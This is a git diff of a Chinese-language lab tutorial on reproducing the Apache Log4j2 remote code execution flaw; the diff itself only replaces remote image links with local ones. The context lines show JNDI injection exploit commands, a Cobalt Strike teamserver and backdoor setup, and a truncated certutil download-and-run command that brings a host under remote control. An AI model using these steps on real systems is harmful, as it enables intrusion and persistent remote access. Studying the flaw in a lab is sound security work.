@@ -4,7 +4,7 @@
 ## 前言
 Apache Log4j2是一款优秀的Java日志记录框架。近日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证， Apache Struts2，Apache Solr， Apache Druid， Apache Flink等均受影响。
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-1.png)
+![](log4j2-1.png)
 
 
 
@@ -18,7 +18,7 @@ Apache Log4j2是一款优秀的Java日志记录框架。近日，阿里云安全
 
 首先去[GitHub](https://github.com/y35uishere/apache-log4j-poc.git)下载漏洞poc代码环境，使用IDEA加载项目文件
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-2.png)
+![](log4j2-2.png)
 
 打开项目文件src/main/java/log4j
 在其中添加一行代码
@@ -27,11 +27,11 @@ Apache Log4j2是一款优秀的Java日志记录框架。近日，阿里云安全
 System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
 ```
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-3.png)  
+![](log4j2-3.png)  
 
 接着去[GitHub](https://github.com/welk1n/JNDI-Injection-Exploit/releases)上下载*JNDI*注入工具  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-4.png)
+![](log4j2-4.png)
 
 
 
@@ -41,18 +41,18 @@ System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "192.168.31.201"
 ```
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-5.png)
+![](log4j2-5.png)
 
 
 将生成的EXP代码复制到漏洞POC代码中  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-6.png)
+![](log4j2-6.png)
 
 ### 运行POC
 点击IDEA工具栏*运行*  
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-7.png)  
+![](log4j2-7.png)  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-8.png)  
+![](log4j2-8.png)  
 
 
 成功弹出计算器！漏洞利用成功！  
@@ -65,26 +65,26 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "192.168.31.2
 teamserver.bat 192.168.31.201 123456
 ```
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-9.png)  
+![](log4j2-9.png)  
 
 打开CobaltStrike连接  
 
 新建监听器保存  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-10.png)  
+![](log4j2-10.png)  
 
 
 点击*攻击* --> *生成后门* --> *Windows可执行程序Stageless*  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-11.png)  
+![](log4j2-11.png)  
 
 选择生成的监听器，输出格式exe  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-12.png)  
+![](log4j2-12.png)  
 
 点击保存  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-13.png)  
+![](log4j2-13.png)  
 
 ### 启动Web服务
 
@@ -96,7 +96,7 @@ python -m http.server 8080
 
 浏览器访问验证  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-14.png)  
+![](log4j2-14.png)  
 
 ### 构造CS上线payload
 
@@ -106,13 +106,13 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "certutil -urlcache -sp
 
 将生成好的payload粘贴到POC代码中  
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-15.png)  
+![](log4j2-15.png)  
 
 点击运行
 
 
 
-![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-16.png)
+![](log4j2-16.png)
 
 成功上线！
 
